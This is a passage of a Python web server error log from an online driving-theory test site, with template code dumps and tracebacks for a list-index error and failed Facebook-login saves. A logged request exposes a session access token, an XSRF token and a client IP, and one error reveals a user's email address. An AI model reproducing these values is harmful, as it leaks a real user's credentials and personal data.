 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505b51818e4c8548017fb42b&answers=%5B0%5D&cursor=17&_xsrf=f74130c103854679aa37dc4a8aa7acd2', headers={'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Length': '93', 'Accept-Language': 'en-us,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:15.0) Gecko/20100101 Firefox/15.0.1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'X-Real-Ip': '109.158.140.86', 'Cookie': '__utma=188782963.1097451186.1347966769.1347966769.1348161699.2; __utmz=188782963.1347966769.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); access_token=QUFBRzZsTmNzNkdjQkFBb2I5dmczT2daQ045SG9zdHZKQ29KcEIwZk5VVklPSGdNc1FxeXRmdjh6M2oxYmZQYVRQUkpaQVdkNDhiNXVUVkJFWkEwUFpDbTFCYm9WVWVZVzJjcG81dHhIU2daRFpE|1347966804|592d2f30a824720894e734a73a82ffbedae24780; _xsrf=f74130c103854679aa37dc4a8aa7acd2; __utmb=188782963.4.10.1348161699; __utmc=188782963', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 73.01ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:test/test.html code:
 1  def _execute():  # base.html:0
 2      _buffer = []  # base.html:0
 3      _append = _buffer.append  # base.html:0
 4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
 5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
 6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
 7      _tmp = static_url('css/base.css')  # base.html:25
 8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
 9      else: _tmp = _utf8(str(_tmp))  # base.html:25
10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
11      _append(_tmp)  # base.html:25
12      _append('" />\n')  # base.html:26
13      for css in kwargs['css_deps']:  # base.html:26
14          _append('\n<link href="')  # base.html:27
15          _tmp = static_url(css)  # base.html:27
16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
17          else: _tmp = _utf8(str(_tmp))  # base.html:27
18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
19          _append(_tmp)  # base.html:27
20          _append('" rel="stylesheet">\n')  # base.html:28
21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n<script type="text/javascript">\nvar _gaq = _gaq || [];\n_gaq.push([\'_setAccount\', \'UA-34526303-1\']);\n_gaq.push([\'_trackPageview\']);\n(function() {\nvar ga = document.createElement(\'script\'); ga.type = \'text/javascript\'; ga.async = true;\nga.src = (\'https:\' == document.location.protocol ? \'https://ssl\' : \'http://www\') + \'.google-analytics.com/ga.js\';\nvar s = document.getElementsByTagName(\'script\')[0]; s.parentNode.insertBefore(ga, s);\n})();\n</script>\n</head>\n<body >\n')  # base.html:56
22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:65 (via base.html:56)
23      _tmp = static_url('imgs/logo.png')  # base.html:65 (via base.html:56)
24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:65 (via base.html:56)
25      else: _tmp = _utf8(str(_tmp))  # base.html:65 (via base.html:56)
26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:65 (via base.html:56)
27      _append(_tmp)  # base.html:65 (via base.html:56)
28      _append('"></a>\n<div class="pull-right">\n')  # base.html:67 (via base.html:56)
29      if not current_user:  # base.html:67 (via base.html:56)
30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:69 (via base.html:56)
31      else:  # base.html:69 (via base.html:56)
32          _append('\n<ul class="nav nav-pills">\n')  # base.html:71 (via base.html:56)
33          if current_user['moderator']:  # base.html:71 (via base.html:56)
34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:73 (via base.html:56)
35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:80 (via base.html:56)
36          _tmp = static_url('imgs/user.png')  # base.html:80 (via base.html:56)
37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80 (via base.html:56)
38          else: _tmp = _utf8(str(_tmp))  # base.html:80 (via base.html:56)
39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:80 (via base.html:56)
40          _append(_tmp)  # base.html:80 (via base.html:56)
41          _append('"></a>\n')  # base.html:81 (via base.html:56)
42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:86 (via base.html:56)
43      _append('\n')  # base.html:88
44      _append('\n<div class="container">\n')  # test/test.html:5 (via base.html:88)
45      test=kwargs['test']  # test/test.html:5 (via base.html:88)
46      _append('\n')  # test/test.html:6 (via base.html:88)
47      _tmp = _modules.Question(test)  # test/test.html:6 (via base.html:88)
48      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # test/test.html:6 (via base.html:88)
49      else: _tmp = _utf8(str(_tmp))  # test/test.html:6 (via base.html:88)
50      _append(_tmp)  # test/test.html:6 (via base.html:88)
51      _append('\n</div>\n')  # test/test.html:8 (via base.html:88)
52      _append('\n')  # base.html:92
53      _tmp = xsrf_form_html()  # base.html:92
54      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:92
55      else: _tmp = _utf8(str(_tmp))  # base.html:92
56      _append(_tmp)  # base.html:92
57      _append('\n')  # base.html:93
58      _append('\n<script src="')  # base.html:94 (via base.html:93)
59      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:94 (via base.html:93)
60      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:94 (via base.html:93)
61      else: _tmp = _utf8(str(_tmp))  # base.html:94 (via base.html:93)
62      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:94 (via base.html:93)
63      _append(_tmp)  # base.html:94 (via base.html:93)
64      _append('"></script>\n<script src="')  # base.html:95 (via base.html:93)
65      _tmp = static_url('js/libs/blurb.min.js')  # base.html:95 (via base.html:93)
66      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:95 (via base.html:93)
67      else: _tmp = _utf8(str(_tmp))  # base.html:95 (via base.html:93)
68      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:95 (via base.html:93)
69      _append(_tmp)  # base.html:95 (via base.html:93)
70      _append('"></script>\n<script src="')  # base.html:96 (via base.html:93)
71      _tmp = static_url('js/IT.js')  # base.html:96 (via base.html:93)
72      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:96 (via base.html:93)
73      else: _tmp = _utf8(str(_tmp))  # base.html:96 (via base.html:93)
74      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:96 (via base.html:93)
75      _append(_tmp)  # base.html:96 (via base.html:93)
76      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:100 (via base.html:93)
77      _append('\n')  # base.html:102
78      for js in kwargs['js_deps']:  # base.html:102
79          _append('\n<script src="')  # base.html:103
80          _tmp = static_url(js)  # base.html:103
81          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:103
82          else: _tmp = _utf8(str(_tmp))  # base.html:103
83          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:103
84          _append(_tmp)  # base.html:103
85          _append('"></script>\n')  # base.html:104
86      _append('\n')  # base.html:106
87      _append('\n')  # test/test.html:11 (via base.html:106)
88      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:118
89      return _utf8('').join(_buffer)  # base.html:0
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['username', 'first_name', 'last_name', 'locale', 'gender', 'fb_id', 'email'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "emilymason18@hotmail.co.uk" })
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
